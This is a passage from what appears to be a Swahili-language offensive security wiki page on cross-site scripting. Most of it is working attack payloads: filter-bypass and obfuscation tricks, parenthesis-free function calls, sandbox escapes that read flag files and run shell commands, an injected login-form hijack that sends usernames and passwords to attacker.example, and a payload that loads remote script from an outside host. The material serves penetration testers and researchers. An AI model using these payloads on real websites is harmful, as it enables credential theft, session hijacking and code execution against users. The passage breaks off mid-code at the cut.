\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
```
Tofauti muhimu ya wigo: `const`/`let` zilizotangazwa ndani ya `eval()` zina block-scoped na HAZIUNDA globals; hazitapatikana kwa scripts zinazofuata. Tumia elementi ya `<script>` iliyodungwa kwa dinamiki ili kufafanua hooks global zisizoweza ku-rebind wakati zinapohitajika (kwa mfano, ku-hijack form handler):
```javascript
var s = document.createElement('script');
s.textContent = "const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
document.head.appendChild(s);
```
Marejeo: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

### Unicode Encode utekelezaji wa JS
```javascript
alert(1)
alert(1)
alert(1)
```
### JavaScript bypass blacklists techniques

**Strings**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**Escapes maalum**
```javascript
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
// Any other char escaped is just itself
```
**Ubadilishaji wa nafasi ndani ya JS code**
```javascript
<TAB>
/**/
```
**JavaScript comments (kutoka** [**JavaScript Comments**](#javascript-comments) **triki)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScript mistari mipya (kutoka kwa** [**JavaScript new line**](#javascript-new-lines) **mbinu)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10)
alert("//\nalert(1)") //0x0a
String.fromCharCode(13)
alert("//\ralert(1)") //0x0d
String.fromCharCode(8232)
alert("//\u2028alert(1)") //0xe2 0x80 0xa8
String.fromCharCode(8233)
alert("//\u2029alert(1)") //0xe2 0x80 0xa9
```
**Nafasi tupu za JavaScript**
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**Javascript ndani ya comment**
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript bila mabano ya mviringo**
```javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x`

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.

```
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**Wito la function yoyote (alert)**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
```
## **DOM vulnerabilities**

Kuna **msimbo wa JS** unaotumia **data isiyo salama inayodhibitiwa na mshambuliaji** kama `location.href`. Mshambuliaji anaweza kutumia hili kutekeleza msimbo wa JS anayetaka.\
**Kwa sababu ya urefu wa maelezo kuhusu** [**DOM vulnerabilities imehamishiwa kwenye ukurasa huu**](dom-xss.md)**:**


{{#ref}}
dom-xss.md
{{#endref}}

Huko utapata **maelezo ya kina ya ni nini DOM vulnerabilities, zinaanzishwaje, na jinsi ya kuzitumia**.\
Pia, usisahau kwamba **mwishoni mwa chapisho lililotajwa** unaweza kupata maelezo kuhusu [**DOM Clobbering attacks**](dom-xss.md#dom-clobbering).

### Kuboresha Self-XSS

### Cookie XSS

Kama unaweza kusababisha XSS kwa kutuma payload ndani ya cookie, hiyo kawaida huwa self-XSS. Hata hivyo, ukigundua **subdomain dhaifu kwa XSS**, unaweza kutumia XSS hii kuingiza cookie katika domain nzima na kusababisha cookie XSS katika domain kuu au subdomains nyingine (ile zilizo dhaifu kwa cookie XSS). Kwa hili unaweza kutumia cookie tossing attack:


{{#ref}}
../hacking-with-cookies/cookie-tossing.md
{{#endref}}

Unaweza kupata matumizi mazuri ya mbinu hii katika [**chapisho hili la blogu**](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html).

### Kutuma session yako kwa admin

Labda mtumiaji anaweza kushiriki profile yake na admin na kama self XSS iko ndani ya profile ya mtumiaji na admin anaiingia, ataamsha udhaifu.

### Session Mirroring

Kama utapata self XSS na ukurasa wa wavuti una session mirroring kwa administrators, kwa mfano kuruhusu wateja kuomba msaada na ili admin akupe msaada atakuwa anaona kile unachoona katika session yako lakini kutoka session yake.

Unaweza kufanya **administrator aamsha self XSS yako** na kumwibia cookie/session yake.

## Njia nyingine za kupitisha vizuizi

### Kupita sanitization kupitia WASM linear-memory template overwrite

Wakati web app inapotumia Emscripten/WASM, strings za kudumu (kama HTML format stubs) ziko katika writable linear memory. Kujaa kwa buffer ndani ya WASM moja (kwa mfano, memcpy isiyokaguliwa katika njia ya uhariri) kunaweza kuharibu miundo jirani na kuelekeza maandishi kwa constants hizo. Kuandika upya template kama "<article><p>%.*s</p></article>" kuwa "<img src=1 onerror=%.*s>" kunageuza input iliyosafishwa kuwa JavaScript handler value na kusababisha DOM XSS mara moja wakati wa render.

Angalia ukurasa maalum wenye workflow ya kutekeleza, DevTools memory helpers, na defenses:

{{#ref}}
wasm-linear-memory-template-overwrite-xss.md
{{#endref}}


### Normalised Unicode

Unaweza kukagua kama **maadili yaliyoreflektwa** yanapofanyiwa **unicode normalized** kwenye server (au upande wa client) na kutumia functionality hii kupitisha ulinzi. [**Pata mfano hapa**](../unicode-injection/index.html#xss-cross-site-scripting).

### PHP FILTER_VALIDATE_EMAIL flag Bypass
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails bypass

Kutokana na **RoR mass assignment** nukuu zinaingizwa ndani ya HTML na kisha kizuizi cha nukuu kinavunjwa, na mashamba ya ziada (onfocus) yanaweza kuongezwa ndani ya tag.\
Mfano wa fomu ([from this report](https://hackerone.com/reports/709336)), ikiwa utatuma payload:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
Jozi "Key","Value" itarudishwa kama ifuatavyo:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
Kisha, attribute onfocus itaingizwa na XSS itatokea.

### Mchanganyiko maalum
```html
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### XSS na header injection katika 302 response

Ikiwa ugundua kuwa unaweza **inject headers in a 302 Redirect response** unaweza kujaribu **make the browser execute arbitrary JavaScript**. Hii ni **not trivial** kwa sababu modern browsers hazitafsiri HTTP response body ikiwa HTTP response status code ni 302, hivyo cross-site scripting payload pekee haifai.

Katika [**this report**](https://www.gremwell.com/firefox-xss-302) na [**this one**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) unaweza kusoma jinsi ya kujaribu several protocols ndani ya Location header na kuona kama yoyote yao inaruhusu the browser kuchunguza na execute the XSS payload ndani ya body.\
Protocols zilizojulikana hapo awali: `mailto://`, `//x:1/`, `ws://`, `wss://`, _empty Location header_, `resource://`.

### Herufi, Nambari na Nukta Pekee

Ikiwa unaweza kuonyesha the **callback** ambayo javascript itakayofanya **execute** ikiwa imeruhusiwa tu kwa herufi, nambari na nukta. [**Read this section of this post**](#javascript-function) ili ujue jinsi ya kutumia tabia hii vibaya.

### Content-Types sahihi za `<script>` kwa XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Ikiwa utajaribu kupakia script yenye **content-type** kama `application/octet-stream`, Chrome itatoa kosa lifuatalo:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

Peke tu **Content-Type** ambazo zitawezesha Chrome kuendesha **loaded script** ni zile zilizo ndani ya const **`kSupportedJavascriptTypes`** kutoka [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc)
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### Aina za Script kwa XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Hivyo, ni aina gani zinaweza kuonyeshwa ili kupakia script?
```html
<script type="???"></script>
```
Jibu ni:

- **module** (chaguo-msingi, hakuna cha kufafanua)
- [**webbundle**](https://web.dev/web-bundles/): Web Bundles ni kipengele kinachokuruhusu kuweka pamoja data nyingi (HTML, CSS, JS…) ndani ya faili ya **`.wbn`**.
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
- [**importmap**](https://github.com/WICG/import-maps)**:** Inaruhusu kuboresha sintaks ya import
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment"
import { partition } from "lodash"
</script>
```
Tabia hii ilitumika katika [**this writeup**](https://github.com/zwade/yaca/tree/master/solution) kuremapa library kwa eval ili kutumiwa vibaya ambavyo vinaweza kusababisha XSS.

- [**speculationrules**](https://github.com/WICG/nav-speculation)**:** Kipengele hiki kimeundwa hasa kutatua baadhi ya matatizo yanayosababishwa na pre-rendering. Kinafanya kazi kama ifuatavyo:
```html
<script type="speculationrules">
{
"prerender": [
{ "source": "list", "urls": ["/page/2"], "score": 0.5 },
{
"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1
}
]
}
</script>
```
### Web Content-Types kwa XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Aina zifuatazo za content types zinaweza kutekeleza XSS katika browsers zote:

- text/html
- application/xhtml+xml
- application/xml
- text/xml
- image/svg+xml
- text/plain (?? si kwenye orodha lakini nadhani niliona hii kwenye CTF)
- application/rss+xml (off)
- application/atom+xml (off)

Katika browsers nyingine, **`Content-Types`** nyingine zinaweza kutumika kutekeleza JS yoyote, angalia: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml Content Type

Ikiwa ukurasa unarudisha content-type ya text/xml, inawezekana kuonyesha namespace na kutekeleza JS yoyote:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### Mifumo Maalum ya Ubadilishaji

Wakati kitu kama **`"some {{template}} data".replace("{{template}}", <user_input>)`** kinapotumika. Mshambuliaji anaweza kutumia [**special string replacements**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the_replacement) kujaribu kupita baadhi ya ulinzi: `` "123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"})) ``

Kwa mfano katika [**this writeup**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA), hili lilitumika ku-escape JSON string ndani ya script na kutekeleza arbitrary code.

### Chrome Cache to XSS


{{#ref}}
chrome-cache-to-xss.md
{{#endref}}

### XS Jails Escape

Kama una seti ndogo tu ya chars za kutumia, angalia hizi suluhisho nyingine zinazofaa kwa matatizo ya XSJail:
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
Ikiwa **everything is undefined** kabla ya kuendesha untrusted code (kama katika [**this writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html#miscx2fundefined55-solves)) inawezekana kuzalisha vitu vinavyofaa "out of nothing" ili kutekeleza matumizi mabaya ya arbitrary untrusted code:

- Kutumia import()
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))
```
- Kupata `require` kwa njia isiyo ya moja kwa moja

[According to this](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) modules zimefungwa na Node.js ndani ya function, kama ifuatavyo:
```javascript
;(function (exports, require, module, __filename, __dirname) {
// our actual module code
})
```
Kwa hivyo, ikiwa kutoka module hiyo tunaweza **kuita function nyingine**, inawezekana kutumia `arguments.callee.caller.arguments[1]` kutoka kwenye ile function kufikia **`require`**:
```javascript
;(function () {
return arguments.callee.caller.arguments[1]("fs").readFileSync(
"/flag.txt",
"utf8"
)
})()
```
Kwa njia inayofanana na mfano uliotangulia, inawezekana **use error handlers** kufikia **wrapper** ya module na kupata kazi ya **`require`**:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = "".constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) =>
structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log("=".repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req("child_process").execSync("id").toString())
}
}
}
trigger()
```
### Obfuscation & Advanced Bypass

- **Obfuscations mbalimbali katika ukurasa mmoja:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
- [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
- [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
- [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
- [http://www.jsfuck.com/](http://www.jsfuck.com)
- - JSFuck ya kitaalamu zaidi: [https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
- [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
- [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
- [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>
([,ウ,,,,ア]=[]+{}
,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
```

```javascript
//aaencode
ﾟωﾟﾉ = /｀ｍ´）ﾉ ~┻━┻   / /*´∇｀*/["_"]
o = ﾟｰﾟ = _ = 3
c = ﾟΘﾟ = ﾟｰﾟ - ﾟｰﾟ
ﾟДﾟ = ﾟΘﾟ = (o ^ _ ^ o) / (o ^ _ ^ o)
ﾟДﾟ = {
ﾟΘﾟ: "_",
ﾟωﾟﾉ: ((ﾟωﾟﾉ == 3) + "_")[ﾟΘﾟ],
